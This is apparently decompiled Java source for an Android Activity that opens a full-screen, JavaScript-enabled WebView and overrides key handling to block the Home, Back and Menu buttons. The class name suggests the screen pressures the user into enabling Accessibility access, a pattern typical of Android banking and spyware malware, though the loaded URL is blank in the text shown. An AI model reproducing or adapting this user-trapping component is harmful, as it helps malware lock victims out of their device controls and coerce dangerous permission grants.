package com.example.mmm.Activity;

import android.app.Activity;
import android.os.Bundle;
import android.view.KeyEvent;
import android.webkit.WebView;
import com.example.mmm.constants;
import com.example.mmm.Utils.utils;

public class actToaskAccessibility extends Activity {
   utils utl = new utils();
   constants consts = new constants();
   WebView carpet$;

   public void onBackPressed() {
      super.onBackPressed();
   }

   protected void onCreate(Bundle var1) {
      super.onCreate(var1);
      this.carpet$ = new WebView(this);
      this.carpet$.getSettings().setJavaScriptEnabled(true);
      this.carpet$.setScrollBarStyle(0);
      this.carpet$.setWebViewClient(new actToaskAccessibility$MyWebViewClient(this, (byte)0));
      this.carpet$.setWebChromeClient(new actToaskAccessibility$MyWebChromeClient(this, (byte)0));
      this.carpet$.loadUrl("");
      this.setContentView(this.carpet$);
   }

   public void onDestroy() {
      super.onDestroy();
      this.carpet$.removeAllViewsInLayout();
      this.carpet$.removeAllViews();
      this.carpet$.destroy();
      this.carpet$ = null;
      this.finish();
   }

   public boolean onKeyDown(int var1, KeyEvent var2) {
      if (var1 == 3) {
         return true;
      } else if (var1 == 4) {
         return true;
      } else {
         return var1 == 82;
      }
   }

   protected void onStart() {
      super.onStart();
   }

   protected void onStop() {
      super.onStop();
   }
}
